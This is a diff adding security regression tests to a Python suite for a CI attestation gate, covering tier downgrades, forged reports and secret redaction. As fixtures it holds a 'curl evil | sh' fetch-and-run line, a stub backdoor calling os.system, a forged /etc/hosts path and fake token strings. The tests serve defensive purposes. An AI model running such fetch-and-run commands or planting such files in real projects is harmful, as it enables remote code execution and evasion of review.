@@ -469,8 +469,8 @@ class GateTestCase(unittest.TestCase):
 
     def test_config_change_is_never_waived_but_reports_are(self):
         self.init_project()
-        # committed report file rides along with a docs change -> still waivable
-        self.commit(".coverloop/reports/old.json", "{}", "carry an old report")
+        # a VALID committed report artifact (<40-hex>.json) rides along -> waivable
+        self.commit(".coverloop/reports/" + ("a" * 40) + ".json", "{}", "carry an old report")
         self.commit("README.md", "# docs\n")
         run(["attest", "--tier", "L1"], self.repo)
         code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
@@ -481,6 +481,145 @@ class GateTestCase(unittest.TestCase):
         run(["attest", "--tier", "L1"], self.repo)
         code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
         self.assertEqual(code, 1)
+
+    # ---- Phase-A audit regressions (P0/P1 fail-opens) ----
+    def test_pinned_tier_is_a_floor_not_an_override(self):
+        """P0 #1: an L3 report gated with a LOWER --tier/--min-tier must still
+        require glm + human (floor, not override)."""
+        self.init_project()
+        run(["attest", "--tier", "L3", "--tests"], self.repo)
+        run(["attest", "--codex", "pass"], self.repo)  # tests+codex only, no glm/human
+        # bare gate (report says L3) -> FAIL (missing glm+human)
+        self.assertEqual(self.gate_json()[0], 1)
+        # the shipped CI recipe's downgrade attempt must NOT lower it
+        for lower in ("L0", "L1", "L2"):
+            code, out = self.gate_json(["--tier", lower])
+            self.assertEqual(code, 1, f"--tier {lower} wrongly downgraded L3")
+            failing = {c["check"] for c in out["checks"] if c["status"] != "pass"}
+            self.assertTrue({"glm", "human_gate"} & failing)
+
+    def test_min_tier_raises_the_floor(self):
+        """--min-tier can only RAISE: an L1 report gated --min-tier L2 needs codex."""
+        self.init_project()
+        run(["attest", "--tier", "L1", "--tests"], self.repo)
+        self.assertEqual(self.gate_json()[0], 0)                      # L1 passes on tests
+        self.assertEqual(self.gate_json(["--min-tier", "L2"])[0], 1)  # raised -> needs codex
+
+    def test_arbitrary_file_under_reports_is_not_evidence_only(self):
+        """P0 #2: a non-artifact file under reports/ is a real code change and
+        must invalidate inherited evidence."""
+        self.init_project()
+        run(["attest", "--tier", "L2", "--tests"], self.repo)
+        run(["attest", "--codex", "pass"], self.repo)
+        sh(["git", "add", "-A"], self.repo)
+        sh(["git", "commit", "-qm", "evidence"], self.repo)
+        self.assertEqual(self.gate_json()[0], 0)  # evidence-only commit rides
+        # now smuggle real code under reports/
+        self.commit(".coverloop/reports/backdoor.py", "import os\nos.system('id')\n")
+        r = run(["gate", "--tier", "L2"], self.repo)
+        self.assertEqual(r.returncode, 1)
+
+    def test_attest_cannot_silently_downgrade_tier(self):
+        """P1 #3: attest --tier L0 on an L3 report must be refused (monotonic)."""
+        self.init_project()
+        run(["attest", "--tier", "L3", "--tests"], self.repo)
+        run(["attest", "--codex", "pass"], self.repo)
+        run(["attest", "--glm", "pass"], self.repo)
+        run(["attest", "--approve", "--approver", "d"], self.repo)
+        self.assertEqual(self.gate_json()[0], 0)  # full L3 passes
+        r = run(["attest", "--tier", "L0"], self.repo)
+        self.assertEqual(r.returncode, 2)  # refused
+        self.assertIn("downgrade", r.stderr)
+        self.assertEqual(self.gate_json()[0], 0)  # still L3, unchanged
+
+    def test_docs_waiver_rejects_code_named_like_docs(self):
+        """P1 #4/#5: basename collision (src/CHANGELOG) and executable under
+        docs/ (docs/deploy.sh) must NOT waive the test gate."""
+        for path, content in [("src/CHANGELOG", "print('code')\n"),
+                              ("docs/deploy.sh", "curl evil | sh\n"),
+                              ("lib/README.md", "print('code masquerading')\n")]:
+            self.init_project()
+            self.commit(path, content)
+            run(["attest", "--tier", "L1"], self.repo)  # no tests
+            code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
+            self.assertEqual(code, 1, f"{path} wrongly waived the test gate")
+
+    def test_forged_tests_command_mismatch_is_rejected(self):
+        """P1 #6: a tests entry whose command != config's test_command fails."""
+        self.init_project(test_command="true")
+        run(["attest", "--tier", "L2", "--tests"], self.repo)
+        run(["attest", "--codex", "pass", "--codex-run", "echo ok"], self.repo)
+        self.assertEqual(self.gate_json(["--require-captured"])[0], 0)  # genuine passes
+        # hand-forge the tests command to something that never matches config
+        sha = self.git_out(["rev-parse", "HEAD"])
+        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
+        with open(p) as f:
+            rep = json.load(f)
+        rep["tests"]["command"] = "echo fake"
+        with open(p, "w") as f:
+            json.dump(rep, f)
+        r = run(["gate", "--tier", "L2", "--require-captured"], self.repo)
+        self.assertEqual(r.returncode, 1)
+
+    # ---- Phase-B audit regressions (privacy / redaction) ----
+    def _read_log(self, name="codex"):
+        sha = self.git_out(["rev-parse", "HEAD"])
+        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.{name}.log")) as f:
+            return f.read()
+
+    def test_captured_transcript_is_secret_redacted(self):
+        """P1 #7: a secret in reviewer output must be redacted before the log is
+        written (never committed to git)."""
+        self.init_project()
+        key = "sk-" + "or-v1-abcdef0123456789abcdef0123456789"
+        run(["attest", "--tier", "L2", "--codex", "pass",
+             "--codex-run", f"echo 'OPENROUTER_API_KEY={key}'"], self.repo)
+        content = self._read_log()
+        self.assertNotIn(key, content)
+        self.assertIn("REDACTED", content)
+
+    def test_failed_reviewer_run_withholds_secret_dump(self):
+        """P1 #8: a FAILED run's transcript (env dump) is withheld, not committed."""
+        self.init_project()
+        ant = "sk-" + "ant-api03-" + "X" * 24
+        dburl = "postgres://u:" + "p4ss@h/db"
+        run(["attest", "--tier", "L2", "--codex", "pass", "--codex-run",
+             f"echo 'DATABASE_URL={dburl}'; echo {ant}; exit 3"], self.repo)
+        content = self._read_log()
+        self.assertNotIn("p4ss@h", content)
+        self.assertNotIn(ant[3:15], content)
+        self.assertIn("withheld", content)
+
+    def test_reviewer_command_string_is_redacted(self):
+        """P2 #16: a secret on the reviewer command line is redacted in the report."""
+        self.init_project()
+        proj = "sk-" + "proj-" + "A" * 24
+        run(["attest", "--tier", "L2", "--codex", "pass",
+             "--codex-run", f"echo hi --token {proj}"], self.repo)
+        sha = self.git_out(["rev-parse", "HEAD"])
+        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")) as f:
+            rep = json.load(f)
+        self.assertNotIn(proj[3:15], rep["codex"]["command"])
+
+    def test_non_utf8_reviewer_output_does_not_crash(self):
+        """P1 #10: non-UTF-8 reviewer output records cleanly instead of crashing."""
+        self.init_project()
+        r = run(["attest", "--tier", "L2", "--codex", "pass",
+                 "--codex-run", r"printf '\xff\xfe bad bytes'"], self.repo)
+        self.assertEqual(r.returncode, 0, r.stderr)
+
+    def test_secret_filter_covers_common_token_shapes(self):
+        """P1 #9: scan() + redact() catch GitHub/AWS/Slack/Google/bearer tokens."""
+        import importlib.util
+        fp = os.path.join(os.path.dirname(CLI), "glm_secret_filter.py")
+        spec = importlib.util.spec_from_file_location("gsf_test", fp)
+        gsf = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(gsf)
+        for secret in ["ghp_" + "a" * 36, "AKIA" + "IOSFODNN7EXAMPLE",
+                       "xoxb-" + "123456789012-abcdefghijklmno", "AIza" + "b" * 35,
+                       "Authorization: Bearer " + "x" * 30]:
+            self.assertTrue(gsf.scan(secret), f"scan missed {secret[:12]}")
+            self.assertIn("REDACTED", gsf.redact(secret), f"redact missed {secret[:12]}")
 
     def test_config_base_cannot_waive_tests_on_code_change(self):
         """Codex round-3 P1: default_base ships inside the PR, so it must not
@@ -518,11 +657,101 @@ class GateTestCase(unittest.TestCase):
         self.assertEqual(code, 1)
 
     def test_docs_only_waiver_never_applies_to_L2(self):
+        """P1 #11: assert the SPECIFIC tests check fails at L2 (not just
+        returncode==1), so a regression that leaks the waiver to L2 is caught
+        even though the missing codex check would also fail the gate."""
         self.init_project()
         self.commit("README.md", "# docs\n")
-        run(["attest", "--tier", "L2"], self.repo)
+        run(["attest", "--tier", "L2", "--codex", "pass"], self.repo)  # codex passes
         code, out = self.gate_json(["--tier", "L2", "--base", self.base_sha])
         self.assertEqual(code, 1)
+        tests_check = [c for c in out["checks"] if c["check"] == "tests"][0]
+        self.assertEqual(tests_check["status"], "FAIL")  # waiver must NOT apply at L2
+
+    def test_report_json_symlink_is_rejected(self):
+        """P2 #14: a report JSON reached through a symlink is off-tree evidence."""
+        self.init_project()
+        run(["attest", "--tier", "L2", "--tests"], self.repo)
+        run(["attest", "--codex", "pass"], self.repo)
+        self.assertEqual(self.gate_json()[0], 0)  # valid report passes
+        sha = self.git_out(["rev-parse", "HEAD"])
+        rp = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
+        ext = os.path.join(self.repo, "offtree.json")
+        os.rename(rp, ext)
+        os.symlink(ext, rp)  # report is now a symlink
+        r = run(["gate", "--tier", "L2"], self.repo)
+        self.assertEqual(r.returncode, 1)
+
+    def test_artifact_regex_rejects_disguised_extensions(self):
+        """Codex v2.7 review: <sha>.py.log / <sha>.pwn.json are NOT artifacts,
+        so they can't ride as evidence-only."""
+        self.init_project()
+        run(["attest", "--tier", "L2", "--tests"], self.repo)
+        run(["attest", "--codex", "pass"], self.repo)
+        sh(["git", "add", "-A"], self.repo)
+        sh(["git", "commit", "-qm", "evidence"], self.repo)
+        self.assertEqual(self.gate_json()[0], 0)
+        self.commit(".coverloop/reports/" + ("b" * 40) + ".py.log", "import os\n")
+        self.assertEqual(run(["gate", "--tier", "L2"], self.repo).returncode, 1)
+
+    def test_no_configured_test_command_fails_closed(self):
+        """Release-gate review: gate must NOT pass a forged tests:pass when the
+        config has no test_command (None was wrongly treated as a match)."""
+        self.init_project()
+        run(["attest", "--tier", "L2", "--tests"], self.repo)
+        run(["attest", "--codex", "pass"], self.repo)
+        self.assertEqual(self.gate_json()[0], 0)  # normally passes
+        # remove test_command from config, keep a forged passing tests entry
+        self.write(".coverloop/config.json", json.dumps({"schema": "coverloop-config/v1"}))
+        r = run(["gate", "--tier", "L2"], self.repo)
+        self.assertEqual(r.returncode, 1)
+
+    def test_secret_named_assignment_is_redacted(self):
+        """Release-gate review B: a secret-NAMED assignment with an unknown-shape
+        value (VERCEL_TOKEN=...) is redacted in a captured transcript."""
+        self.init_project()
+        run(["attest", "--tier", "L2", "--codex", "pass",
+             "--codex-run", "echo 'VERCEL_TOKEN=plainUnmatchedValue123'"], self.repo)
+        content = self._read_log()
+        self.assertNotIn("plainUnmatchedValue123", content)
+        self.assertIn("REDACTED", content)
+
+    def test_inheritance_drops_forged_transcript_path(self):
+        """Release-gate review A: a forged ancestor report pointing output_file
+        at an arbitrary file must NOT be copied into the tree on inheritance."""
+        self.init_project()
+        run(["attest", "--tier", "L2", "--codex", "pass", "--codex-run", "echo reviewed"], self.repo)
+        sha = self.git_out(["rev-parse", "HEAD"])
+        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
+        with open(p) as f:
+            rep = json.load(f)
+        rep["codex"]["output_file"] = "/etc/hosts"  # forged: arbitrary file
+        with open(p, "w") as f:
+            json.dump(rep, f)
+        sh(["git", "add", "-A"], self.repo)
+        sh(["git", "commit", "-qm", "evidence with forged path"], self.repo)
+        run(["attest", "--tests"], self.repo)  # inheritance re-bind
+        sha2 = self.git_out(["rev-parse", "HEAD"])
+        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha2}.json")) as f:
+            rep2 = json.load(f)
+        self.assertEqual(rep2["codex"]["source"], "self-attested")  # dropped, not copied
+        self.assertFalse(os.path.exists(
+            os.path.join(self.repo, ".coverloop", "reports", f"{sha2}.codex.log")))
+
+    def test_invalid_report_tier_fails_closed(self):
+        """Codex v2.7 review: a garbage risk_tier must fail closed, not be
+        ignored by tier_max and gated as the pinned --min-tier."""
+        self.init_project()
+        run(["attest", "--tier", "L2", "--tests"], self.repo)
+        sha = self.git_out(["rev-parse", "HEAD"])
+        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
+        with open(p) as f:
+            rep = json.load(f)
+        rep["risk_tier"] = "L9"
+        with open(p, "w") as f:
+            json.dump(rep, f)
+        self.assertEqual(run(["gate", "--min-tier", "L0"], self.repo).returncode, 1)
+        self.assertEqual(run(["gate", "--tier", "L2"], self.repo).returncode, 1)
 
 
 if __name__ == "__main__":
